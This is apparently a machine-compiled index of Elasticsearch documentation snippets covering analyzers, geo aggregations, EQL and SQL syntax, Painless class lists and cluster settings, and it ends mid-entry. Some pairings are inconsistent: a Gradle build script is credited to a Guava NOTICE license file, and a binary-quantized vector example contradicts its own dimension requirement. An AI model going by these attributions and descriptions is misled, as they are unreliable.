\nxpack.monitoring.exporters.$NAME.ssl.truststore.path: \nxpack.monitoring.exporters.$NAME.ssl.truststore.password: \nxpack.monitoring.exporters.$NAME.ssl.truststore.secure_password: \n```\n\n----------------------------------------\n\nTITLE: Customizing Length Token Filter with Specific Character Limits\nDESCRIPTION: Creates a custom Length token filter that removes tokens shorter than 2 characters and longer than 10 characters, incorporating it into a custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-length-tokenfilter.md#2025-04-22_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT length_custom_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_length_2_to_10_char\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"length_2_to_10_char\" ]\n        }\n      },\n      \"filter\": {\n        \"length_2_to_10_char\": {\n          \"type\": \"length\",\n          \"min\": 2,\n          \"max\": 10\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IntStream Interface in Painless - Java\nDESCRIPTION: Describes the IntStream interface, which handles a sequence of int values. It supports operations like map, filter, reduce, and collect, all tailored for int data types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.IntStream {\n  boolean allMatch(IntPredicate)\n  boolean anyMatch(IntPredicate)\n  DoubleStream asDoubleStream()\n  LongStream asLongStream()\n  OptionalDouble average()\n  Stream boxed()\n  IntStream.Builder builder()\n  def collect(Supplier,ObjIntConsumer,BiConsumer)\n  IntStream concat(IntStream,IntStream)\n  long count()\n  IntStream distinct()\n  IntStream empty()\n  IntStream filter(IntPredicate)\n  OptionalInt findAny()\n  OptionalInt findFirst()\n  IntStream flatMap(IntFunction)\n  void forEach(IntConsumer)\n  void forEachOrdered(IntConsumer)\n  PrimitiveIterator.OfInt iterator()\n  IntStream limit(long)\n  IntStream map(IntUnaryOperator)\n  DoubleStream mapToDouble(IntToDoubleFunction)\n  LongStream mapToLong(IntToLongFunction)\n  Stream mapToObj(IntFunction)\n  OptionalInt max()\n  OptionalInt min()\n  boolean noneMatch(IntPredicate)\n  IntStream of(int[])\n  IntStream peek(IntConsumer)\n  IntStream range(int,int)\n  IntStream rangeClosed(int,int)\n  OptionalInt reduce(IntBinaryOperator)\n  int reduce(int,IntBinaryOperator)\n  IntStream sequential()\n  IntStream skip(long)\n  IntStream sorted()\n  Spliterator.OfInt spliterator()\n  int sum()\n  IntSummaryStatistics summaryStatistics()\n  int[] toArray()\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Populating Geopoint Index\nDESCRIPTION: Example showing different ways to specify geopoints in Elasticsearch, including GeoJSON, WKT, lat/lon objects, arrays, strings, and geohash formats. Also demonstrates a geo_bounding_box query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-point.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"Geopoint as an object using GeoJSON format\",\n  \"location\": {\n    \"type\": \"Point\",\n    \"coordinates\": [-71.34, 41.12]\n  }\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"text\": \"Geopoint as a WKT POINT primitive\",\n  \"location\" : \"POINT (-71.34 41.12)\"\n}\n\nPUT my-index-000001/_doc/3\n{\n  \"text\": \"Geopoint as an object with 'lat' and 'lon' keys\",\n  \"location\": {\n    \"lat\": 41.12,\n    \"lon\": -71.34\n  }\n}\n\nPUT my-index-000001/_doc/4\n{\n  \"text\": \"Geopoint as an array\",\n  \"location\": [ -71.34, 41.12 ]\n}\n\nPUT my-index-000001/_doc/5\n{\n  \"text\": \"Geopoint as a string\",\n  \"location\": \"41.12,-71.34\"\n}\n\nPUT my-index-000001/_doc/6\n{\n  \"text\": \"Geopoint as a geohash\",\n  \"location\": \"drm3btev3e86\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"geo_bounding_box\": {\n      \"location\": {\n        \"top_left\": {\n          \"lat\": 42,\n          \"lon\": -72\n        },\n        \"bottom_right\": {\n          \"lat\": 40,\n          \"lon\": -74\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Standardizing Empty Collections Usage\nDESCRIPTION: Requires using Collections#empty(List|Map|Set) methods instead of EMPTY constants to avoid unchecked warnings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_16\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Avoid unchecked warnings by using Collections#empty(List|Map|Set) methods\njava.util.Collections#EMPTY_LIST\njava.util.Collections#EMPTY_MAP\njava.util.Collections#EMPTY_SET\n```\n\n----------------------------------------\n\nTITLE: Time-Series Aggregation Response Example\nDESCRIPTION: Sample response showing the grouped geo-line data using time-series aggregation, with results organized by TSID and including GeoJSON Features.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"aggregations\": {\n    \"path\": {\n      \"buckets\": {\n        \"{city=Paris}\": {\n          \"key\": {\n            \"city\": \"Paris\"\n          },\n          \"doc_count\": 2,\n          \"museum_tour\": {\n            \"type\": \"Feature\",\n            \"geometry\": {\n              \"coordinates\": [ [ 2.336389, 48.861111 ], [ 2.327, 48.86 ] ],\n              \"type\": \"LineString\"\n            },\n            \"properties\": {\n              \"complete\": true\n            }\n          }\n        },\n        \"{city=Antwerp}\": {\n          \"key\": {\n            \"city\": \"Antwerp\"\n          },\n          \"doc_count\": 3,\n          \"museum_tour\": {\n            \"type\": \"Feature\",\n            \"geometry\": {\n              \"coordinates\": [ [ 4.401384, 51.220292 ], [ 4.405819, 51.221758 ], [ 4.4052, 51.2229 ] ],\n              \"type\": \"LineString\"\n            },\n            \"properties\": {\n              \"complete\": true\n            }\n          }\n        },\n        \"{city=Amsterdam}\": {\n          \"key\": {\n            \"city\": \"Amsterdam\"\n          },\n          \"doc_count\": 5,\n          \"museum_tour\": {\n            \"type\": \"Feature\",\n            \"geometry\": {\n              \"coordinates\": [ [ 4.889187, 52.373184 ], [ 4.885057, 52.370159 ], [ 4.901618, 52.369219 ], [ 4.91235, 52.374081 ], [ 4.914722, 52.371667 ] ],\n              \"type\": \"LineString\"\n            },\n            \"properties\": {\n              \"complete\": true\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining DecimalStyle Class in Java\nDESCRIPTION: The DecimalStyle class encapsulates the formatting styles for representing decimal numbers. It includes standard styles for negative and positive signs, decimal separator, and zero digit, and allows the customization of these symbols according to locales.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.DecimalStyle {\n  DecimalStyle STANDARD\n  Set getAvailableLocales()\n  char getDecimalSeparator()\n  char getNegativeSign()\n  char getPositiveSign()\n  char getZeroDigit()\n  DecimalStyle of(Locale)\n  DecimalStyle ofDefaultLocale()\n  DecimalStyle withDecimalSeparator(char)\n  DecimalStyle withNegativeSign(char)\n  DecimalStyle withPositiveSign(char)\n  DecimalStyle withZeroDigit(char)\n}\n```\n\n----------------------------------------\n\nTITLE: ReindexScript Class for Reindex Operations\nDESCRIPTION: This snippet defines the org.elasticsearch.script.ReindexScript class. It provides a method to retrieve metadata related to the reindexing script, allowing users to manage the associated information effectively. The class interacts with the Metadata class for operational details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.reindex.txt#2025-04-21_snippet_3\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.ReindexScript {\n    Metadata metadata()\n    WriteField field(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-line Aggregation Query\nDESCRIPTION: Example query demonstrating how to perform a geo_line aggregation on geo_point data sorted by timestamp.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /test/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"line\": {\n      \"geo_line\": {\n        \"point\": {\"field\": \"my_location\"},\n        \"sort\":  {\"field\": \"@timestamp\"}\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Server Project in Gradle\nDESCRIPTION: This Gradle script configures the Elasticsearch server project, including plugin applications, dependency management, and build settings. It sets up the project structure, defines subprojects, and configures various build tasks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/guava-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: gradle\nCODE:\n```\napply plugin: 'elasticsearch.build'\napply plugin: 'elasticsearch.publish'\n\ndependencies {\n  api project(':server')\n  api project(':libs:elasticsearch-core')\n  api project(':libs:elasticsearch-logging')\n  api project(':libs:elasticsearch-secure-sm')\n  api project(':libs:elasticsearch-x-content')\n  api project(':libs:elasticsearch-geo')\n}\n\nsubprojects {\n  group = 'org.elasticsearch.plugin'\n}\n\nproject.archivesBaseName = \"elasticsearch\"\n\nconfigure(subprojects.findAll { it.parent == project }) {\n  /*\n   * All subprojects to the server project get the elasticseach.build plugin\n   * by default, and are added to archives by default, unless they explicitly\n   * have archivesBaseName set to the empty string.\n   */\n  apply plugin: 'elasticsearch.build'\n\n  if (it.findProperty('archivesBaseName') != '') {\n    apply plugin: 'elasticsearch.publish'\n  }\n}\n\njavadoc {\n  exclude 'org/elasticsearch/bootstrap/BootstrapInfo.java'\n  exclude 'org/elasticsearch/common/io/stream/BytesStreamOutput.java'\n  exclude 'org/elasticsearch/common/util/SlicedDoubleArray.java'\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Text and Existing Documents in more_like_this Query\nDESCRIPTION: An example showing how to mix free text with references to existing documents in a more_like_this query, using the syntax similar to Multi GET API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-mlt-query.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"more_like_this\": {\n      \"fields\": [ \"title\", \"description\" ],\n      \"like\": [\n        {\n          \"_index\": \"imdb\",\n          \"_id\": \"1\"\n        },\n        {\n          \"_index\": \"imdb\",\n          \"_id\": \"2\"\n        },\n        \"and potentially some more text here as well\"\n      ],\n      \"min_term_freq\": 1,\n      \"max_query_terms\": 12\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: IP Range Aggregation with CIDR Masks\nDESCRIPTION: Shows how to use CIDR mask notation to define IP ranges for aggregation queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-iprange-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /ip_addresses/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ip_ranges\": {\n      \"ip_range\": {\n        \"field\": \"ip\",\n        \"ranges\": [\n          { \"mask\": \"10.0.0.0/25\" },\n          { \"mask\": \"10.0.0.127/25\" }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with CJK Bigram Token Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how the CJK bigram token filter works using the analyze API. It tokenizes a Japanese text sample and forms bigrams from the tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-cjk-bigram-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"cjk_bigram\"],\n  \"text\" : \"東京都は、日本の首都であり\"\n}\n```\n\n----------------------------------------\n\nTITLE: Fingerprint Analyzer in Elasticsearch\nDESCRIPTION: Specialized analyzer for creating text fingerprints useful for duplicate detection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_7\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"fingerprint\"\n```\n\n----------------------------------------\n\nTITLE: Basic HTTP Host Configuration in Elasticsearch\nDESCRIPTION: Configuration setting for specifying the HTTP interface binding address. Can accept IP address, hostname, or special network interface values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.host: 0.0.0.0\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Pod Metric Document\nDESCRIPTION: This JSON snippet represents a document containing pod metrics from Kubernetes, designed to be indexed into Elasticsearch. It includes a timestamp, metricset (pod), Kubernetes pod details (name, UID), network statistics (tx, rx), and CPU usage (limit, nanocores, node). No specific dependencies are needed beyond proper configuration of data collection and Elasticsearch indexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/server/single-node/src/javaRestTest/resources/tsdb-bulk-request.txt#2025-04-21_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"@timestamp\": \"2021-04-29T17:29:12.470Z\",\n  \"metricset\": \"pod\",\n  \"k8s\": {\n    \"pod\": {\n      \"name\": \"cat\",\n      \"uid\": \"947e4ced-1786-4e53-9e0c-5c447e959507\",\n      \"network\": {\n        \"tx\": 2001818691,\n        \"rx\": 802133794\n      },\n      \"cpu\": {\n        \"limit\": 0.3787411612903226,\n        \"nanocores\": 35222928,\n        \"node\": 0.048845732\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Optional 'by' Fields in EQL\nDESCRIPTION: Demonstrates how to use the '?' operator to mark 'by' fields as optional in EQL sequences, allowing for null join keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_15\n\nLANGUAGE: eql\nCODE:\n```\nsequence by process.pid, ?process.entity_id\n  [process where process.name == \"regsvr32.exe\"]\n  [network where true]\n```\n\n----------------------------------------\n\nTITLE: Response from nori_readingform Token Filter Analysis in Elasticsearch\nDESCRIPTION: This snippet shows the response from analyzing text using the nori_readingform token filter. It demonstrates how the Hanja characters are converted to their Hangul equivalents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-readingform.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"향가\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 2,\n    \"type\" : \"word\",\n    \"position\" : 0\n  }]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Thai Text with Elasticsearch Thai Tokenizer\nDESCRIPTION: This snippet demonstrates how to use the Thai tokenizer in Elasticsearch to segment Thai text into words. It sends a POST request to the _analyze endpoint with the tokenizer set to 'thai' and provides a sample Thai text for analysis.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-thai-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"thai\",\n  \"text\": \"การที่ได้ต้องแสดงว่างานดี\"\n}\n```\n\n----------------------------------------\n\nTITLE: SHOW TABLES with Multi-target Syntax\nDESCRIPTION: Shows how to use Elasticsearch multi-target syntax to exclude tables starting with 'l' while including all others.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES \"*,-l*\";\n```\n\n----------------------------------------\n\nTITLE: Random Score Function Example\nDESCRIPTION: This snippet shows how to use the `randomScore` function to generate random scores for documents. It uses a seed value of 100 and the '_seq_no' field as a source of randomness.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"randomScore(100, '_seq_no')\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Querying Pass-through Objects in Elasticsearch\nDESCRIPTION: Demonstrates how to create an index with a pass-through object mapping and query it both with direct field access and full path access.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/passthrough.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"attributes\": {\n        \"type\": \"passthrough\",\n        \"priority\": 10,\n        \"properties\": {\n          \"id\": {\n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"attributes\" : {\n    \"id\": \"foo\",\n    \"zone\": 10\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"match\": { \"id\": \"foo\" }},\n        { \"match\": { \"zone\": 10 }}\n      ]\n    }\n  }\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"match\": { \"attributes.id\": \"foo\" }},\n        { \"match\": { \"attributes.zone\": 10 }}\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Shard Balancing Heuristics in Elasticsearch\nDESCRIPTION: Advanced settings that control how Elasticsearch calculates node weights and determines optimal shard distribution. Includes threshold and weight factors for various balancing criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.balance.threshold: 1.0\ncluster.routing.allocation.balance.shard: 0.45\ncluster.routing.allocation.balance.index: 0.55\ncluster.routing.allocation.balance.disk_usage: 2e-11\ncluster.routing.allocation.balance.write_load: 10.0\n```\n\n----------------------------------------\n\nTITLE: Using Wildcards in EQL String Comparisons\nDESCRIPTION: Demonstrates the use of '*' and '?' wildcards in EQL string comparisons with the ':' operator and 'like' keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_11\n\nLANGUAGE: eql\nCODE:\n```\nmy_field : \"doc*\"     // Matches \"doc\", \"docs\", or \"document\" but not \"DOS\"\nmy_field : \"*doc\"     // Matches \"adoc\" or \"asciidoc\"\nmy_field : \"d*c\"      // Matches \"doc\" or \"disc\"\n\nmy_field like \"DOC*\"  // Matches \"DOC\", \"DOCS\", \"DOCs\", or \"DOCUMENT\" but not \"DOS\"\nmy_field like \"D*C\"   // Matches \"DOC\", \"DISC\", or \"DisC\"\n```\n\nLANGUAGE: eql\nCODE:\n```\nmy_field : \"doc?\"     // Matches \"docs\" but not \"doc\", \"document\", or \"DOS\"\nmy_field : \"?doc\"     // Matches \"adoc\" but not \"asciidoc\"\nmy_field : \"d?c\"      // Matches \"doc\" but not \"disc\"\n\nmy_field like \"DOC?\"  // Matches \"DOCS\" or \"DOCs\" but not \"DOC\", \"DOCUMENT\", or \"DOS\"\nmy_field like \"D?c\"   // Matches \"DOC\" but not \"DISC\"\n```\n\nLANGUAGE: eql\nCODE:\n```\nmy_field : (\"doc*\", \"f*o\", \"ba?\", \"qux\")\nmy_field like (\"Doc*\", \"F*O\", \"BA?\", \"QUX\")\n```\n\n----------------------------------------\n\nTITLE: Creating a Binary Quantized Dense Vector Index\nDESCRIPTION: This snippet shows how to create a binary quantized index (bbq_hnsw) which reduces each dimension to a single bit. This reduces memory by 96% with larger accuracy cost and requires dimensions greater than 64.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nPUT my-byte-quantized-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 64,\n        \"index\": true,\n        \"index_options\": {\n          \"type\": \"bbq_hnsw\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Logging realm_authentication_failed Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the realm authentication failed event. This event is logged for every realm that fails to present a valid authentication token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:10:15,510+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"rest\", \"event.action\":\n\"realm_authentication_failed\", \"user.name\":\"elastic\", \"origin.type\":\"rest\",\n\"origin.address\":\"[::1]:51504\", \"realm\":\"myTestRealm1\", \"url.path\":\n\"/_security/user/user1\", \"url.query\":\"pretty\", \"request.method\":\"POST\",\n\"request.id\":\"POv8p_qeTl2tb5xoFl0HIg\"}\n```\n\n----------------------------------------\n\nTITLE: Including Type Information for CATEGORIZE Function in Markdown\nDESCRIPTION: Markdown code to include type information for the CATEGORIZE function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/categorize.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/categorize.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Fetching All Records\nDESCRIPTION: JSON configuration for advanced sync rules to fetch all Redis database records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"key_pattern\": \"*\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: DATEDIFF Example: Difference in Hours\nDESCRIPTION: Demonstrates finding the difference in hours between two datetimes using DATEDIFF. The example illustrates how DATEDIFF truncates more detailed time fields to zero before calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_32\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATEDIFF('hours', '2019-11-10T12:10:00.000Z'::datetime, '2019-11-10T23:59:59.999Z'::datetime) AS \\\"diffInHours\\\";\\n\\n      diffInHours\n------------------------\n11\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Tangent in SQL\nDESCRIPTION: The TAN function returns the tangent of a numeric expression that represents an angle in radians. It requires one numeric input and outputs a double numeric value, and will return null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_49\n\nLANGUAGE: sql\nCODE:\n```\nTAN(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Querying with Tail Pipe in EQL\nDESCRIPTION: Returns up to a specified number of events or sequences, starting with the most recent matches. This example returns up to five of the most recent svchost.exe processes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-pipe-ref.md#2025-04-21_snippet_2\n\nLANGUAGE: eql\nCODE:\n```\nprocess where process.name == \"svchost.exe\"\n| tail 5\n```\n\n----------------------------------------\n\nTITLE: SQL Query for LAST Aggregation\nDESCRIPTION: This SQL query selects the last value of the date field from the test table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_25\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT LAST(date) FROM test;\n```\n\n----------------------------------------\n\nTITLE: Using a Numeric 'Now' Parameter in Painless Scripts\nDESCRIPTION: JSON configuration for passing the current time as a numeric parameter to a Painless script. This approach is recommended as it avoids the need for parsing in the script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_23\n\nLANGUAGE: JSON\nCODE:\n```\n...\n\"script\": {\n    ...\n    \"params\": {\n        \"now\": <generated numeric datetime in milliseconds since epoch>\n    }\n}\n...\n```\n\n----------------------------------------\n\nTITLE: Geo-bounds Aggregation Result for Geo_point Fields in Elasticsearch\nDESCRIPTION: This snippet shows the response format for a geo-bounds aggregation on geo_point fields. It includes the top_left and bottom_right coordinates of the bounding box.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geobounds-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"viewport\": {\n      \"bounds\": {\n        \"top_left\": {\n          \"lat\": 48.86111099738628,\n          \"lon\": 2.3269999679178\n        },\n        \"bottom_right\": {\n          \"lat\": 48.85999997612089,\n          \"lon\": 2.3363889567553997\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GeoIP Pipeline with No Match Example\nDESCRIPTION: Example demonstrating what happens when an IP address cannot be found in the GeoIP database - no target field is added to the document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPUT _ingest/pipeline/geoip\n{\n  \"description\" : \"Add ip geolocation info\",\n  \"processors\" : [\n    {\n      \"geoip\" : {\n        \"field\" : \"ip\"\n      }\n    }\n  ]\n}\n\nPUT my-index-000001/_doc/my_id?pipeline=geoip\n{\n  \"ip\": \"80.231.5.0\"\n}\n\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Sibling Pipeline Aggregation with buckets_path\nDESCRIPTION: Example of a max_bucket sibling pipeline aggregation that uses buckets_path to reference metrics in another aggregation at the same level.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"max_monthly_sales\": {\n      \"max_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\" <1>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Translating SQL Datetime Functions to Elasticsearch JSON\nDESCRIPTION: This example shows how SQL datetime functions and operations are translated into Elasticsearch scripts. It includes date addition and comparison operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT int FROM test WHERE DATE_ADD('quarter',int, date) > '2018-09-04'::date;\n```\n\nLANGUAGE: json\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalSqlScriptUtils.dateAdd(params.v0,InternalQlScriptUtils.docValue(doc,params.v1),InternalQlScriptUtils.docValue(doc,params.v2),params.v3),InternalSqlScriptUtils.asDateTime(params.v4)))\n\"params\":{\"v0\":\"quarter\",\"v1\":\"int\",\"v2\":\"date\",\"v3\":\"Z\",\"v4\":\"2018-09-04T00:00:00.000Z\"}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Azure VM IP Address (Shell)\nDESCRIPTION: This snippet shows how to retrieve the IP address of an Azure VM using the Azure CLI. This is useful if the public IP address changes after VM recreation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-scale.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\n# Look at Network `Endpoints 0 Vip`\nazure vm show myesnode1\n```\n\n----------------------------------------\n\nTITLE: Using Phrase Suggester in Elasticsearch Search Query\nDESCRIPTION: This snippet shows how to use the phrase suggester in an Elasticsearch search query, including configuration of size, gram size, and highlighting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST test/_search\n{\n  \"suggest\": {\n    \"text\": \"noble prize\",\n    \"simple_phrase\": {\n      \"phrase\": {\n        \"field\": \"title.trigram\",\n        \"size\": 1,\n        \"gram_size\": 3,\n        \"direct_generator\": [ {\n          \"field\": \"title.trigram\",\n          \"suggest_mode\": \"always\"\n        } ],\n        \"highlight\": {\n          \"pre_tag\": \"<em>\",\n          \"post_tag\": \"</em>\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Case-Insensitive Username Start Filter - Elasticsearch\nDESCRIPTION: This query is similar to the previous but enables case-insensitive matching for `user_name` starting with 'A' or 'B'. Employs the `prefix` query with the `case_insensitive` flag set to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_6\n\nLANGUAGE: 